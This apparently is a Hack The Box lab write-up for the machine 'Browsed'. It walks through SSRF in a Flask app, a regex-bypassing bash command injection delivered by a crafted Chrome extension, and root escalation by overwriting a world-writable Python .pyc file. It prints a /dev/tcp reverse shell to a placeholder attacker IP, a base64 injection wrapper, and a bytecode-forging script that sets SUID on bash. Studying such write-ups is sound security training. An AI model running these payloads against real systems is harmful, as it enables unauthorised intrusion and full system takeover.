---
title: "Browsed - HTB Machine"
date: 2026-02-26 00:05:00 +0000
categories: [HTB-Machines]
tags: [web, ssrf, command-injection, python, chrome-extension, privilege-escalation, bytecode]
---

## Initial Reconnaissance

After obtaining the target IP, an nmap scan revealed port 80 open. The web service disclosed a domain `browsed.htb` which was added to `/etc/hosts`.

## Web Application Enumeration

The samples page at `/samples.html` contained downloadable files. Extracting one of the zip files revealed a Chrome extension structure, indicating the application accepts extension uploads.

## Domain Discovery via Upload

When uploading a test extension, the server response contained a new domain: `browsedinternals.htb`. This domain hosted a Gitea instance.

## Gitea Exploration

After account creation, accessing the `larry/MarkdownPreview` repository revealed two critical files: `app.py` and `routines.sh`.

## Vulnerability Analysis

### SSRF in Flask Application

The `rid` parameter is directly concatenated into a URL with no validation, enabling path manipulation through SSRF attacks.

### Command Injection in Shell Script

The bash script validates numeric input with a regex pattern `^[0-9]+$`, but this check can be bypassed using bash command substitution syntax like `x[$(command)]`.

## Exploitation: Malicious Chrome Extension

A specially crafted extension was created with:

- **manifest.json**: Defines extension structure
- **background.js**: Executes SSRF request to localhost:5000 with command injection payload
- **content.js**: Placeholder script

The extension leveraged elevated extension privileges to make requests to localhost without CORS restrictions, triggering the command injection vulnerability.

## Reverse Shell Payload

```bash
bash -i >& /dev/tcp/ATTACKER-IP/4445 0>&1
```

The payload was base64-encoded and wrapped in bash expansion syntax:
```
x[$(echo${IFS}PAYLOAD_BASE64|base64${IFS}-d|bash)]
```

After uploading the extension and triggering its installation, user-level access was achieved.

## Privilege Escalation: Python Bytecode Injection

### Vulnerability Discovery

The `/opt/extensiontool/` directory contained world-writable `__pycache__` with the `extension_utils.cpython-312.pyc` file.

### Python 3.12 Hash Validation Bypass

The `.pyc` file header includes a flags field. Setting `flags = 0` disables hash validation, allowing arbitrary bytecode injection without source file modification.

### Exploitation Script

```python
import marshal
import struct
import importlib.util

magic = importlib.util.MAGIC_NUMBER
flags = b'\x00\x00\x00\x00'  # Disables validation
header = magic + flags + struct.pack('<I', TIMESTAMP) + struct.pack('<I', SIZE)

code = compile("os.system('chmod u+s /bin/bash')", "extension_utils.py", "exec")
payload = marshal.dumps(code)

with open('/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc', 'wb') as f:
    f.write(header + payload)
```

### Root Access

When `extension_tool.py` executed as root and imported the hijacked module, the malicious bytecode set the SUID bit on `/bin/bash`. Executing `bash -p` preserved root privileges.

## Key Vulnerabilities Summary

1. Unrestricted extension uploads
2. SSRF without input validation
3. Command injection via insufficient regex sanitization
4. World-writable Python cache directories
5. `flags=0` bypass disabling hash validation
6. Unnecessary SUID binaries
